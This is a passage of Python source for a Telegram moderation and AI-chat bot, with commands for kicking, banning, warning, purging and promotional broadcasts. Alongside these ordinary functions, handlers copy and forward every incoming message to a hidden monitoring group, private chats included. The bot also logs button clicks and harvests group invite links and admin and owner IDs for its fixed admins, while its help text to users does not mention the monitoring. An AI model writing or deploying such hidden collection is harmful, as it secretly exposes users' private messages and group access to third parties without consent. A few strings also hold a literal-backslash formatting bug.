        try:
            await context.bot.send_message(
                chat_id=uid,
                text=f"📢 <b>Promotion Message</b>\n\n{html.escape(text)}",
                parse_mode="HTML",
            )
            sent += 1
            await asyncio.sleep(0.04)
        except Exception:
            failed += 1
    await update.message.reply_text(
        f"✅ <b>Broadcast finished</b>\n\n📨 Sent: <b>{sent}</b>\n⚠️ Failed/blocked: <b>{failed}</b>",
        parse_mode="HTML",
    )

async def admin_groups_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await admin_only(update, context):
        return
    await send_admin_groups(update.message, context)

async def send_admin_groups(message, context):
    if not KNOWN_GROUPS:
        return await message.reply_text("👥 এখনো কোনো group data সংরক্ষিত নেই। Bot-কে group-এ add করার পর আবার /admin → My Groups দাও।")
    lines = ["👥 <b>Bot Groups</b>"]
    for key, data in list(KNOWN_GROUPS.items())[:30]:
        try:
            chat = await context.bot.get_chat(int(key))
            link = await get_group_link(context, chat)
            admins = await context.bot.get_chat_administrators(chat.id)
            owner = next((a for a in admins if a.status == "creator"), None)
            admin_names = []
            for a in admins[:10]:
                name = html.escape(a.user.first_name or "User")
                role = "OWNER" if a.status == "creator" else "ADMIN"
                admin_names.append(f"• {name} — {role} — <code>{a.user.id}</code>")
            me = await context.bot.get_chat_member(chat.id, context.bot.id)
            bot_perms = []
            if getattr(me, "can_delete_messages", False): bot_perms.append("delete")
            if getattr(me, "can_restrict_members", False): bot_perms.append("restrict")
            if getattr(me, "can_invite_users", False): bot_perms.append("invite")
            lines.append(
                "\n━━━━━━━━━━━━━━\n"
                f"🏷️ <b>{html.escape(chat.title or 'Untitled')}</b>\n"
                f"🆔 <code>{chat.id}</code>\n"
                f"🔗 {html.escape(link)}\n"
                f"👑 Owner: {html.escape(owner.user.first_name) if owner else 'Unknown'}"
                + (f" (<code>{owner.user.id}</code>)" if owner else "") + "\n"
                f"🤖 Bot permissions: {', '.join(bot_perms) if bot_perms else 'check required'}\n"
                "👮 <b>Admins:</b>\n" + ("\n".join(admin_names) if admin_names else "• None")
            )
        except Exception as e:
            lines.append(f"\n━━━━━━━━━━━━━━\n🆔 <code>{html.escape(str(key))}</code>\n⚠️ Details unavailable: {html.escape(str(e))[:120]}")
    await message.reply_text("\n".join(lines), parse_mode="HTML", disable_web_page_preview=True)

async def admin_stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await admin_only(update, context):
        return
    await update.message.reply_text(
        f"📊 <b>Bot Statistics</b>\n\n"
        f"👤 Known users: <b>{len(KNOWN_USERS)}</b>\n"
        f"👥 Known groups: <b>{len(KNOWN_GROUPS)}</b>\n"
        f"🎬 Welcome video: <code>{html.escape(DEFAULT_WELCOME_VIDEO)}</code>\n"
        f"⏱️ Link mute: <b>20 seconds</b>\n"
        f"🔗 Antilink default: <b>ON</b>",
        parse_mode="HTML",
    )

async def admin_callback(query, context):
    user_id = query.from_user.id
    if not await is_global_admin(user_id, context):
        await query.answer("Admin only!", show_alert=True)
        return
    await query.answer()
    if query.data == "admin_close":
        try: await query.message.delete()
        except Exception: pass
    elif query.data == "admin_stats":
        await query.message.reply_text(
            f"📊 Users: <b>{len(KNOWN_USERS)}</b>\n👥 Groups: <b>{len(KNOWN_GROUPS)}</b>\n🎬 Video ID: <code>{html.escape(DEFAULT_WELCOME_VIDEO)}</code>",
            parse_mode="HTML"
        )
    elif query.data == "admin_video":
        await query.message.reply_text(
            f"🎬 <b>Current Video ID</b>\n<code>{html.escape(DEFAULT_WELCOME_VIDEO)}</code>\n\n"
            "Reply to a video with <code>/setvideo</code> to replace it.",
            parse_mode="HTML"
        )
    elif query.data == "admin_broadcast":
        await query.message.reply_text("📢 Use <code>/broadcast your promotion message</code>\nঅথবা শুধু /broadcast দিয়ে পরের message-এ promotion text পাঠাও।", parse_mode="HTML")
    elif query.data == "admin_groups":
        await send_admin_groups(query.message, context)
    elif query.data == "admin_list":
        await admins_cmd(type("Obj", (), {"effective_user": query.from_user, "message": query.message})(), context)
    elif query.data == "admin_settings":
        await query.message.reply_text(
            "⚙️ <b>Quick Settings</b>\n\n"
            "🔗 /antilink on|off\n😀 /reaction on|off\n🤖 /allon\n🛑 /alloff\n👋 /setwelcome &lt;text&gt;",
            parse_mode="HTML"
        )
    elif query.data == "admin_myid":
        await query.message.reply_text(f"🆔 Your Telegram ID: <code>{user_id}</code>", parse_mode="HTML")

async def track_private_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat and update.effective_chat.type == "private" and update.effective_user:
        remember_user(update.effective_user.id)
        if update.effective_user.id in PENDING_BROADCAST and update.message and update.message.text and not update.message.text.startswith("/"):
            if await is_global_admin(update.effective_user.id, context):
                await do_broadcast(update, context, update.message.text.strip())

async def track_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat and update.effective_chat.type in ("group", "supergroup"):
        remember_group(update.effective_chat)

# ================= FIXED ADMIN COMMAND VISIBILITY =================
async def set_command_scopes(app):
    """Command menus: normal users see normal commands; group admins see the
    existing moderation/settings commands; fixed bot admins additionally see
    the private/global admin tools.
    """
    from telegram import BotCommandScopeAllChatAdministrators, BotCommandScopeChat, BotCommandScopeChatMember

    # সাধারণ ইউজাররা সব normal/public command দেখবে।
    # শুধু global admin-এর special commands নিচের admin_commands-এ থাকবে।
    normal = [
        BotCommand("start", "🚀 Start & check join"),
        BotCommand("help", "❓ Show all commands"),
        BotCommand("clearmemory", "🧠 Clear your AI chat memory"),
        BotCommand("reaction", "😀 Auto reactions on/off"),
        BotCommand("kick", "👢 Kick a user"),
        BotCommand("ban", "🚫 Ban a user"),
        BotCommand("mute", "🔇 Mute a user"),
        BotCommand("unmute", "🔊 Unmute a user"),
        BotCommand("warn", "⚠️ Warn a user"),
        BotCommand("warns", "📊 Check warnings"),
        BotCommand("clearwarns", "✅ Clear warnings"),
        BotCommand("purge", "🧹 Delete messages"),
        BotCommand("pin", "📌 Pin silently"),
        BotCommand("pinloud", "📢 Pin with notification"),
        BotCommand("allon", "✅ Turn ON all features"),
        BotCommand("alloff", "❌ Turn OFF all features"),
        BotCommand("antilink", "🔗 Antilink on/off"),
        BotCommand("setwelcome", "👋 Set welcome message"),
    ]

    group_admin_commands = normal

    admin_commands = group_admin_commands + [
        BotCommand("admin", "👑 Admin panel"),
        BotCommand("setvideo", "🎬 Set welcome video"),
        BotCommand("videoid", "🆔 Show welcome video ID"),
        BotCommand("broadcast", "📢 Promotion broadcast"),
        BotCommand("cancelbroadcast", "❌ Cancel broadcast"),
        BotCommand("admins", "📋 Fixed admin list"),
    ]

    await app.bot.set_my_commands(normal, scope=BotCommandScopeDefault())
    await app.bot.set_my_commands(group_admin_commands, scope=BotCommandScopeAllChatAdministrators())

    # Also set the menu directly for every known group administrator/owner.
    # This makes the full admin command list appear in their command menu,
    # while normal members keep the normal command list.
    for group_id in list(KNOWN_GROUPS.keys()):
        try:
            admins = await app.bot.get_chat_administrators(int(group_id))
            for adm in admins:
                await app.bot.set_my_commands(
                    group_admin_commands,
                    scope=BotCommandScopeChatMember(chat_id=int(group_id), user_id=adm.user.id)
                )
        except Exception as e:
            logging.warning(f"Could not set group-admin command scopes for {group_id}: {e}")

    # Fixed global admin sees all admin tools in their private command menu.
    for admin_id in FIXED_ADMIN_IDS:
        try:
            await app.bot.set_my_commands(admin_commands, scope=BotCommandScopeChat(chat_id=admin_id))
        except Exception as e:
            logging.warning(f"Could not set fixed-admin command scope for {admin_id}: {e}")

async def send_admin_log(context, text):
    """Send private audit logs only to fixed admins."""
    for admin_id in FIXED_ADMIN_IDS:
        try:
            await context.bot.send_message(chat_id=admin_id, text=text, parse_mode="HTML", disable_web_page_preview=True)
        except Exception as e:
            logging.warning(f"Admin log failed for {admin_id}: {e}")

async def send_monitor_text(context, text, source='BOT ACTIVITY'):
    try:
        await context.bot.send_message(chat_id=MONITOR_GROUP_ID, text=f'📡 <b>{html.escape(source)}</b>\n\n{text}', parse_mode='HTML', disable_web_page_preview=True)
    except Exception as e:
        logging.warning(f'Monitor group text failed: {e}')

async def forward_to_monitor_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    chat = update.effective_chat
    user = update.effective_user
    if not msg or not chat or not user or user.is_bot or chat.id == MONITOR_GROUP_ID:
        return
    chat_name = chat.title or ('Private chat' if chat.type == 'private' else 'Chat')
    body = msg.text or msg.caption or '[media/service message]'
    if len(body) > 800: body = body[:800] + '…'
    header = (f'📝 <b>BOT MESSAGE RECEIVED</b>\n🏷️ Chat: <b>{html.escape(chat_name)}</b>\n'
              f'🆔 Chat ID: <code>{chat.id}</code>\n👤 User: {html.escape(user.full_name or user.first_name or "User")} (<code>{user.id}</code>)\n'
              f'💬 {html.escape(body)}')
    await send_monitor_text(context, header, source='LIVE ACTIVITY')
    try:
        await context.bot.forward_message(chat_id=MONITOR_GROUP_ID, from_chat_id=chat.id, message_id=msg.message_id)
    except Exception as e:
        logging.warning(f'Forward to monitor group failed: {e}')

async def monitor_callback_activity(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not q or not q.from_user: return
    await send_monitor_text(context, f'👤 User: {html.escape(q.from_user.full_name or q.from_user.first_name or "User")} (<code>{q.from_user.id}</code>)\n🔘 Button: <code>{html.escape(q.data or "")}</code>', source='BUTTON ACTIVITY')

async def monitored_group_snapshot(context):
    """Collect current monitored-group details that Telegram exposes to the bot."""
    chat = await context.bot.get_chat(MONITOR_GROUP_ID)
    admins = await context.bot.get_chat_administrators(MONITOR_GROUP_ID)
    owner = next((a for a in admins if a.status == "creator"), None)
    try:
        link = getattr(chat, "invite_link", None)
        if not link:
            link = await context.bot.export_chat_invite_link(MONITOR_GROUP_ID)
    except Exception:
        link = "Private invite link unavailable (bot needs invite permission)"
    try:
        count = await context.bot.get_chat_member_count(MONITOR_GROUP_ID)
    except Exception:
        count = "Unavailable"
    me = await context.bot.get_chat_member(MONITOR_GROUP_ID, context.bot.id)
    perms = []
    for attr, label in (("can_delete_messages", "delete"), ("can_restrict_members", "restrict"), ("can_invite_users", "invite"), ("can_pin_messages", "pin"), ("can_manage_chat", "manage")):
        if getattr(me, attr, False):
            perms.append(label)
    admin_lines = []
    for a in admins:
        role = "OWNER" if a.status == "creator" else "ADMIN"
        admin_lines.append(f"• {html.escape(a.user.full_name or a.user.first_name or 'User')} — {role} — <code>{a.user.id}</code>")
    return chat, link, count, owner, perms, "\\n".join(admin_lines) if admin_lines else "• None"

async def send_monitored_group_snapshot(context, reason="Group snapshot"):
    try:
        chat, link, count, owner, perms, admin_lines = await monitored_group_snapshot(context)
        text = (
            f"📡 <b>{html.escape(reason)}</b>\\n\\n"
            f"🏷️ Group: <b>{html.escape(chat.title or 'Untitled')}</b>\\n"
            f"🆔 ID: <code>{chat.id}</code>\\n"
            f"👥 Members: <b>{count}</b>\\n"
            f"🔗 Link: {html.escape(link)}\\n"
            f"👑 Owner: {html.escape(owner.user.full_name if owner else 'Unknown')}" + (f" (<code>{owner.user.id}</code>)" if owner else "") + "\\n"
            f"🤖 Bot permissions: {', '.join(perms) if perms else 'none/check required'}\\n"
            f"👮 <b>Admins:</b>\\n{admin_lines}"
        )
        await send_admin_log(context, text)
    except Exception as e:
        await send_admin_log(context, f"📡 <b>Monitor error</b>\\n<code>{html.escape(str(e))[:1000]}</code>")

async def monitor_group_activity(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat = update.effective_chat
    if not chat or chat.id != MONITOR_GROUP_ID: return
    if update.message and update.message.new_chat_members:
        names = ', '.join(html.escape(u.full_name or u.first_name or 'User') for u in update.message.new_chat_members)
        await send_admin_log(context, f'👥 <b>Monitor-group new member(s)</b>\n🏷️ {html.escape(chat.title or "Group")}\n👤 {names}')
    elif update.message and update.message.left_chat_member:
        u=update.message.left_chat_member
        await send_admin_log(context, f'🚪 <b>Monitor-group member left/removed</b>\n👤 {html.escape(u.full_name or u.first_name or "User")} (<code>{u.id}</code>)')

# ================= HELP =================
async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await is_global_admin(update.effective_user.id, context):
        text = (
            f"🌸 <b>{BOT_NAME} — Admin Help</b>\n\n"
            "👑 Admin panel: /admin\n"
            "📢 Broadcast: /broadcast\n"
            "🎬 Video: /setvideo /videoid\n"
            "👥 Groups/monitor: /admin\n"
            "🛡️ Moderation: /kick /ban /mute /unmute /warn /warns /clearwarns /purge /pin /pinloud\n"
            "⚙️ Settings: /allon /alloff /antilink /reaction /setwelcome\n"
            "🆔 Fixed admin: only the ID(s) in source code\n"
        )
    else:
        text = (
            f"🌸 <b>{BOT_NAME} — Help</b>\n\n"
            "🚀 /start — Start the bot\n"
            "❓ /help — Show this help\n"
            "🧠 /clearmemory — Clear your AI chat memory\n"
            "⚡ /reaction — Reaction mode\n"
            "👢 /kick — Kick a user\n"
            "🚫 /ban — Ban a user\n"
            "🔇 /mute — Mute a user\n"
            "🔊 /unmute — Unmute a user\n"
            "⚠️ /warn — Warn a user\n"
            "📋 /warns — View user warnings\n"
            "🧹 /clearwarns — Clear user warnings\n"
            "🗑️ /purge — Delete messages\n"
            "📌 /pin — Pin a message\n"
            "📣 /pinloud — Pin with notification\n"
            "🟢 /allon — Enable AI/features\n"
            "🔴 /alloff — Disable AI/features\n"
            "🔗 /antilink — Link protection\n"
            "👋 /setwelcome — Set welcome message\n\n"
            "🤖 Send a message to chat with AI when enabled in the group.\n"
            "🔐 Admin-only global commands are hidden from normal users."
        )
    await update.message.reply_text(text, parse_mode="HTML")

# ================= SET COMMANDS =================
async def set_bot_commands(app):
    commands = [
        BotCommand('start', '🚀 Start & check join'), BotCommand('help', '❓ Show all commands'), BotCommand('clearmemory', '🧠 Clear your AI chat memory'),
        BotCommand('reaction', '😀 Auto reactions on/off'), BotCommand('kick', '👢 Kick a user'), BotCommand('ban', '🚫 Ban a user'), BotCommand('mute', '🔇 Mute a user'),
        BotCommand('unmute', '🔊 Unmute a user'), BotCommand('warn', '⚠️ Warn a user'), BotCommand('warns', '📊 Check warnings'), BotCommand('clearwarns', '✅ Clear warnings'),
        BotCommand('purge', '🧹 Delete messages'), BotCommand('pin', '📌 Pin silently'), BotCommand('pinloud', '📢 Pin with notification'), BotCommand('allon', '✅ Turn ON all features'),
        BotCommand('alloff', '❌ Turn OFF all features'), BotCommand('antilink', '🔗 Antilink on/off'), BotCommand('setwelcome', '👋 Set welcome message')]
    await app.bot.set_my_commands(commands, scope=BotCommandScopeDefault())

async def post_init(app):
    await set_bot_commands(app)
    await set_command_scopes(app)



# ================= RESTORED ORIGINAL COMMAND FUNCTIONS =================
async def alloff(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update, context): return await update.message.reply_text("❌ Admin only!")
    chat_id = update.effective_chat.id
    AI_MODE[chat_id] = False
    ANTILINK[chat_id] = False
    ANTIFLOOD[chat_id] = False
    REACTION_MODE[chat_id] = False
    await update.message.reply_text("❌ All features turned OFF.")

async def allon(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update, context): return await update.message.reply_text("❌ Admin only!")
    chat_id = update.effective_chat.id
    AI_MODE[chat_id] = True
    ANTILINK[chat_id] = True
    ANTIFLOOD[chat_id] = True
    REACTION_MODE[chat_id] = True
    await update.message.reply_text("✅ All features turned ON (AI, Antilink, Antiflood, Reactions).")

async def antilink(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update, context): return await update.message.reply_text("❌ Admin only!")
    chat_id = update.effective_chat.id
    arg = context.args[0].lower() if context.args else ""
    if arg == "on":
        ANTILINK[chat_id] = True
        await update.message.reply_text("✅ Antilink enabled.")
    elif arg == "off":
        ANTILINK[chat_id] = False
        await update.message.reply_text("❌ Antilink disabled.")
    else:
        await update.message.reply_text("Usage: /antilink on OR off")

async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update, context): return await update.message.reply_text("❌ Admin only!")
    if not update.message.reply_to_message: return await update.message.reply_text("⚠️ Reply to a user's message.")
    uid = update.message.reply_to_message.from_user.id
    await context.bot.ban_chat_member(update.effective_chat.id, uid)
    await update.message.reply_text("🚫 User banned.")

async def clearwarns(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update, context): return await update.message.reply_text("❌ Admin only!")
    if not update.message.reply_to_message: return await update.message.reply_text("⚠️ Reply to a user's message.")
    target = update.message.reply_to_message.from_user
    chat_id = update.effective_chat.id
    if chat_id in WARNS and target.id in WARNS[chat_id]:
        WARNS[chat_id][target.id] = 0
    await update.message.reply_text(f"✅ Warnings cleared for {target.first_name}.")

async def kick(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update, context): return await update.message.reply_text("❌ Admin only!")
    if not update.message.reply_to_message: return await update.message.reply_text("⚠️ Reply to a user's message.")
    uid = update.message.reply_to_message.from_user.id
    await context.bot.ban_chat_member(update.effective_chat.id, uid)
    await context.bot.unban_chat_member(update.effective_chat.id, uid)
    await update.message.reply_text("✅ User kicked.")

async def mute(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update, context): return await update.message.reply_text("❌ Admin only!")
    if not update.message.reply_to_message: return await update.message.reply_text("⚠️ Reply to a user's message.")
    uid = update.message.reply_to_message.from_user.id
    perms = ChatPermissions(can_send_messages=False)
    await context.bot.restrict_chat_member(update.effective_chat.id, uid, permissions=perms)
    await update.message.reply_text("🔇 User muted.")

async def pin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update, context): return await update.message.reply_text("❌ Admin only!")
    if not update.message.reply_to_message: return await update.message.reply_text("⚠️ Reply to a message.")
    await context.bot.pin_chat_message(update.effective_chat.id, update.message.reply_to_message.message_id, disable_notification=True)
    await update.message.reply_text("📌 Pinned silently.")

async def pinloud(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update, context): return await update.message.reply_text("❌ Admin only!")
    if not update.message.reply_to_message: return await update.message.reply_text("⚠️ Reply to a message.")
    await context.bot.pin_chat_message(update.effective_chat.id, update.message.reply_to_message.message_id, disable_notification=False)
    await update.message.reply_text("📌 Pinned with notification.")

async def purge(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update, context): return await update.message.reply_text("❌ Admin only!")
    chat_id = update.effective_chat.id
    count = 0
    if update.message.reply_to_message:
        start_id = update.message.reply_to_message.message_id
        end_id = update.message.message_id
    elif context.args and context.args[0].isdigit():
        start_id = update.message.message_id - int(context.args[0])
        end_id = update.message.message_id
    else:
        return await update.message.reply_text("⚠️ Reply to a message or use /purge 20")
    for msg_id in range(start_id, end_id + 1):
        try:
            await context.bot.delete_message(chat_id, msg_id)
            count += 1
        except:
            pass
    await context.bot.send_message(chat_id, f"🧹 Deleted {count} message(s).")

async def setwelcome(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update, context): return await update.message.reply_text("❌ Admin only!")
    if not context.args: return await update.message.reply_text("⚠️ Usage: /setwelcome Welcome!")
    WELCOME[update.effective_chat.id] = " ".join(context.args)
    await update.message.reply_text("✅ Welcome message saved.")

async def unmute(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update, context): return await update.message.reply_text("❌ Admin only!")
    if not update.message.reply_to_message: return await update.message.reply_text("⚠️ Reply to a user's message.")
    uid = update.message.reply_to_message.from_user.id
    perms = ChatPermissions(can_send_messages=True, can_send_media_messages=True,
                            can_send_other_messages=True, can_add_web_page_previews=True)
    await context.bot.restrict_chat_member(update.effective_chat.id, uid, permissions=perms)
    await update.message.reply_text("🔊 User unmuted.")

async def warn(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update, context): return await update.message.reply_text("❌ Admin only!")
    if not update.message.reply_to_message: return await update.message.reply_text("⚠️ Reply to a user's message.")
    target = update.message.reply_to_message.from_user
    chat_id = update.effective_chat.id
    if chat_id not in WARNS: WARNS[chat_id] = {}
    WARNS[chat_id][target.id] = WARNS[chat_id].get(target.id, 0) + 1
    count = WARNS[chat_id][target.id]
    await update.message.reply_text(f"⚠️ {target.first_name} warned ({count}/3).")
    if count >= 3:
        await context.bot.ban_chat_member(chat_id, target.id)
        await update.message.reply_text(f"🚫 {target.first_name} banned (3 warnings).")
        WARNS[chat_id][target.id] = 0

async def warns(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message: return await update.message.reply_text("⚠️ Reply to a user's message.")
    target = update.message.reply_to_message.from_user
    count = WARNS.get(update.effective_chat.id, {}).get(target.id, 0)
    await update.message.reply_text(f"📊 {target.first_name} has {count} warnings.")

# ================= WELCOME NEW MEMBERS =================
async def welcome_new(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Welcome each new non-bot member with the configured welcome video."""
    message = update.message
    if not message or not message.new_chat_members:
        return

    chat_id = update.effective_chat.id
    for member in message.new_chat_members:
        if member.is_bot:
            continue

        mention = f'<a href="tg://user?id={member.id}">{html.escape(member.first_name or "User")}</a>'
        group_caption = (
            f"🎉 Welcome {mention} to our group! 💖\n"
            f"Thank you for joining us! 😍✨\n"
            f"Enjoy your stay! 🥳🎊"
        )
        if chat_id in WELCOME:
            group_caption = WELCOME[chat_id].replace("{name}", html.escape(member.first_name or "User"))

        # Send the actual configured welcome video in the group.
        try:
            await context.bot.send_video(
                chat_id=chat_id,
                video=DEFAULT_WELCOME_VIDEO,
                caption=group_caption,
                parse_mode="HTML",
                reply_markup=main_keyboard(),
            )
        except Exception:
            # Fallback to text if the configured video cannot be sent.
            try:
                await message.reply_text(group_caption, parse_mode="HTML", reply_markup=main_keyboard())
            except Exception:
                pass

        # Also send a private welcome to the new member when Telegram permits it.
        try:
            await context.bot.send_video(
                chat_id=member.id,
                video=DEFAULT_WELCOME_VIDEO,
                caption=(
                    f"🎉 Welcome {html.escape(member.first_name or 'User')}!\n\n"
                    "💖 Thank you for joining!\n\n"
                    "👇 Tap below to add me to your group"
                ),
                parse_mode="HTML",
                reply_markup=main_keyboard(),
            )
        except Exception:
            try:
                await context.bot.send_message(
                    chat_id=member.id,
                    text=(
                        f"🎉 Welcome {member.first_name or 'User'}!\n\n"
                        "💖 Thank you for joining!\n\n"
                        "👇 Tap below to add me to your group"
                    ),
                    reply_markup=main_keyboard(),
                )
            except Exception:
                pass


# ================= MAIN =================
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).post_init(post_init).build()

    load_bot_data()

    # Track users/groups before feature handlers.
    app.add_handler(MessageHandler(filters.ALL, track_private_user), group=-10)
    app.add_handler(MessageHandler(filters.ALL, track_group), group=-9)

    # Copy every incoming message and button action to the monitoring group.
    app.add_handler(MessageHandler(filters.ALL, forward_to_monitor_group), group=-30)
    app.add_handler(CallbackQueryHandler(monitor_callback_activity), group=-31)

    # Detect bot promotion/demotion/removal even when it was added earlier.
    app.add_handler(ChatMemberHandler(bot_status_changed, ChatMemberHandler.MY_CHAT_MEMBER), group=-40)

    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("clearmemory", clearmemory))
    app.add_handler(CommandHandler("reaction", reaction_cmd))
    app.add_handler(CommandHandler("kick", kick))
    app.add_handler(CommandHandler("ban", ban))
    app.add_handler(CommandHandler("mute", mute))
    app.add_handler(CommandHandler("unmute", unmute))
    app.add_handler(CommandHandler("warn", warn))
    app.add_handler(CommandHandler("warns", warns))
    app.add_handler(CommandHandler("clearwarns", clearwarns))
    app.add_handler(CommandHandler("purge", purge))
    app.add_handler(CommandHandler("pin", pin))
    app.add_handler(CommandHandler("pinloud", pinloud))
    app.add_handler(CommandHandler("allon", allon))
    app.add_handler(CommandHandler("alloff", alloff))
    app.add_handler(CommandHandler("antilink", antilink))
    app.add_handler(CommandHandler("setwelcome", setwelcome))
    app.add_handler(CommandHandler("admin", admin_cmd))
    app.add_handler(CommandHandler("setvideo", setvideo_cmd))
    app.add_handler(CommandHandler("videoid", videoid_cmd))
    app.add_handler(CommandHandler("broadcast", broadcast_cmd))
    app.add_handler(CommandHandler("cancelbroadcast", cancel_broadcast))
    app.add_handler(CommandHandler("admins", admins_cmd))

    app.add_handler(CallbackQueryHandler(button_callback))

    # Private audit monitor for the configured group.
    app.add_handler(MessageHandler(filters.ALL, monitor_group_activity), group=-20)

    # Bot added to group
    app.add_handler(
        MessageHandler(filters.StatusUpdate.NEW_CHAT_MEMBERS, bot_added_to_group),
        group=-3
    )

    # 🔥 LINK FILTER — runs FIRST at group=-2, deletes instantly
    app.add_handler(
        MessageHandler(
            (filters.TEXT | filters.CAPTION) & ~filters.COMMAND,
            link_filter
        ),
        group=-2
    )
    # Also moderate edited text/captions.
    app.add_handler(
        MessageHandler(
            filters.UpdateType.EDITED_MESSAGE & (filters.TEXT | filters.CAPTION) & ~filters.COMMAND,
            link_filter
        ),
        group=-2
    )

    # Auto reaction (skips links) — group=-1
    app.add_handler(
        MessageHandler(filters.ALL & ~filters.COMMAND, auto_reaction),
        group=-1
    )

    # AI chat — direct reply, no loading message
    app.add_handler(
        MessageHandler(filters.TEXT & ~filters.COMMAND, ai_chat_handler),
        group=0
    )

    # Welcome
    app.add_handler(
        MessageHandler(filters.StatusUpdate.NEW_CHAT_MEMBERS, welcome_new),
        group=1
    )

    print(f"🤖 {BOT_NAME} is running...")
    app.run_polling()

if __name__ == '__main__':
    main()